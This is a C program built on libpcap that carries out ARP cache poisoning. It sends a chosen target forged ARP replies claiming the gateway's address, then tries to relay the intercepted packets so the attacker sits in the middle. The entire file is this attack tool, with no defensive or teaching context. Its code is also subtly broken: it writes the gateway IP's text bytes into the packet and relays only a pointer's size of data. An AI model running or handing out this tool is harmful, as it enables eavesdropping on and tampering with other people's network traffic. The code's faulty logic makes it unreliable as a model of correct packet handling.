#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
 
unsigned char *mac;
unsigned char *dst_mac;
unsigned char *gateway_mac;
char ip[20];
char gateway_ip[20];
int flag;

int arp_request(char *target_ip, pcap_t *pd); 
int arp_reply(char *target_ip, pcap_t *pd); 

int main(int argc, char **argv)
{
    int fd, cnt=0;
    struct ifreq ifr;
    struct sockaddr_in *sin;
    char *device;
    char target_ip[4];
    char err_buf[PCAP_ERRBUF_SIZE];
    char cmd[256] = {0, };
    struct pcap_pkthdr *header;
	const u_char *pkt_data;
    	
    pcap_t *pd;
    FILE *fp;
 
    if(argc != 2)
    {
        printf("%s <Target IP address>\n", argv[0]);
        return 1;
    }
    
    inet_pton(AF_INET, argv[1], target_ip);
    
    device = pcap_lookupdev(err_buf);
	if(device == NULL)
	{
		printf("pcap_lookupdev error: %s\n", err_buf);
		return 1;
	}
 
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, device);
  
    if((fd=socket(AF_INET, SOCK_DGRAM, 0))<0)
    {
        perror("socket");
        return 1;
    }
 
    if(ioctl(fd, SIOCGIFHWADDR, &ifr)<0)
    {
        perror("ioctl");
        return 1;
    }
 
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	
	inet_ntop(AF_INET, &sin->sin_addr.s_addr, ip, sizeof(ip));
	
    mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    
    printf("Src IP: %s\n", ip); 
    printf("Src mac: %02x:%02x:%02x:%02x:%02x:%02x\n", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
 
    close(fd);
   
	pd = pcap_open_live(device, BUFSIZ, 0, -1, err_buf);	
    
    
    arp_request(target_ip, pd);
    
    flag = 0;
    while(flag==0)
    {		
		if(pcap_next_ex(pd, &header, &pkt_data) < 0)
		{
			printf("Couldn't receive packets\n");
			return -1;
		}
				
		struct ether_header *ep;
		unsigned short ether_type;
		ep = (struct ether_header *)pkt_data;
		ether_type = ntohs(ep->ether_type);
		if(ether_type == 0x0806)
		{
			dst_mac = ep->ether_shost;	
			flag = 1;
		}			
	}
    
    printf("Dst mac: %02x:%02x:%02x:%02x:%02x:%02x\n", dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);     
    
    //get gateway address
    sprintf(cmd, "route | grep default | awk '{print $2}'");
    fp = popen(cmd, "r");
    fgets(gateway_ip, sizeof(gateway_ip), fp);
    printf("Gateway IP: %s", gateway_ip);
    
    arp_request(gateway_ip, pd); 
    
    flag = 0;
    while(flag==0)
    {
		if(pcap_next_ex(pd, &header, &pkt_data) < 0)
		{
			printf("Couldn't receive packets\n");
			return -1;
		}
				
		struct ether_header *ep;
		unsigned short ether_type;
		
		ep = (struct ether_header *)pkt_data;
		ether_type = ntohs(ep->ether_type);
		
		if(ether_type == 0x0806)
		{
			gateway_mac = ep->ether_shost;	
			flag = 1;
		}			
	}
	
    printf("Gateway mac: %02x:%02x:%02x:%02x:%02x:%02x\n", gateway_mac[0], gateway_mac[1], gateway_mac[2], gateway_mac[3], gateway_mac[4], gateway_mac[5]);   
    
    while(1) 
    {
		arp_reply(target_ip, pd); //send arp reply
		
		if(pcap_next_ex(pd, &header, &pkt_data) < 0)
		{
			printf("Couldn't receive packets\n");
			return -1;
		}
		else
		{
			struct ether_header *ep;
			struct ip *iph;
			//unsigned short ether_type;
			int i;		

			//ethernet header   
			ep = (struct ether_header *)pkt_data;    
			
			// add size of ethernet header   
			pkt_data += sizeof(struct ether_header);
			
			iph = (struct ip *)pkt_data;
				
			for(i=0;i<6;i++)
			{					
				if((ep->ether_dhost[i] == mac[i])&&(ep->ether_shost[i] == dst_mac[i]))
					cnt++;
			}
				
			if(cnt==6)
			{
				cnt = 0;
				inet_ntop(AF_INET, &iph->ip_dst, gateway_ip, sizeof(gateway_ip));
			
				for(i=0;i<6;i++)					
				{
					ep->ether_dhost[i] = gateway_mac[i]; //change dst_mac
					ep->ether_shost[i] = mac[i]; //change src_mac					
				}
				
				if(pcap_inject(pd, pkt_data, sizeof(pkt_data))==-1) 
				{
					pcap_perror(pd, 0);
					pcap_close(pd);
					exit(1);
				}
				else
					printf("relay!\n");
			}
		}
	}
    
    return 0;
}

int arp_request(char *target_ip, pcap_t *pd) //Who has 
{
	unsigned char arp_pkt[42] = {0,};
	char my_ip[4];
	int i;
	
	inet_pton(AF_INET, ip, my_ip);
	
	//ethernet hdr
	for(i=0;i<6;i++)
	{
		arp_pkt[i] = 0xff; //broadcast
		arp_pkt[6+i] = mac[i]; //src_mac
	}	
	arp_pkt[12] = 0x08; arp_pkt[13] = 0x06; //ethertype: arp		
	
	//arp header
	arp_pkt[14] = 0x00; arp_pkt[15] = 0x01; //hardware type: ethernet
	arp_pkt[16] = 0x08;	arp_pkt[17] = 0x00;//protocol type: IPv4
	arp_pkt[18] = 0x06; //hardware size
	arp_pkt[19] = 0x04; //protocol size
	arp_pkt[20] = 0x00; arp_pkt[21] = 0x01; //Opcode
	
	for(i=0;i<6;i++)
	{
		arp_pkt[22+i] = mac[i]; //src_mac
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[28+i] = my_ip[i]; //src_ip
	}
	
	for(i=0;i<6;i++)
	{
		arp_pkt[32+i] = 0x00; //anonymous
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[38+i] = target_ip[i]; //dst_ip
	}	
	
	if(pcap_inject(pd, arp_pkt, sizeof(arp_pkt))==-1) 
	{
        pcap_perror(pd, 0);
        pcap_close(pd);
        exit(1);
	}
	
	return 0;
}


int arp_reply(char *target_ip, pcap_t *pd) //I am gateway
{
	unsigned char arp_pkt[42] = {0,};
	char my_ip[4];
	int i;
	
	inet_pton(AF_INET, ip, my_ip);
	
	//ethernet hdr
	for(i=0;i<6;i++)
	{
		arp_pkt[i] = dst_mac[i]; //dst_mac
		arp_pkt[6+i] = mac[i]; //src_mac
	}	
	arp_pkt[12] = 0x08; arp_pkt[13] = 0x06; //ethertype: arp		
	
	//arp header
	arp_pkt[14] = 0x00; arp_pkt[15] = 0x01; //hardware type: ethernet
	arp_pkt[16] = 0x08;	arp_pkt[17] = 0x00;//protocol type: IPv4
	arp_pkt[18] = 0x06; //hardware size
	arp_pkt[19] = 0x04; //protocol size
	arp_pkt[20] = 0x00; arp_pkt[21] = 0x02; //Opcode
	
	for(i=0;i<6;i++)
	{
		arp_pkt[22+i] = mac[i]; //src_mac
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[28+i] = gateway_ip[i]; //gateway_ip
	}
	
	for(i=0;i<6;i++)
	{
		arp_pkt[32+i] = dst_mac[i]; //dst_mac
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[38+i] = target_ip[i]; //dst_ip
	}	
	
	if(pcap_inject(pd, arp_pkt, sizeof(arp_pkt))==-1) 
	{
        pcap_perror(pd, 0);
        pcap_close(pd);
        exit(1);
	}
	
	return 0;
}

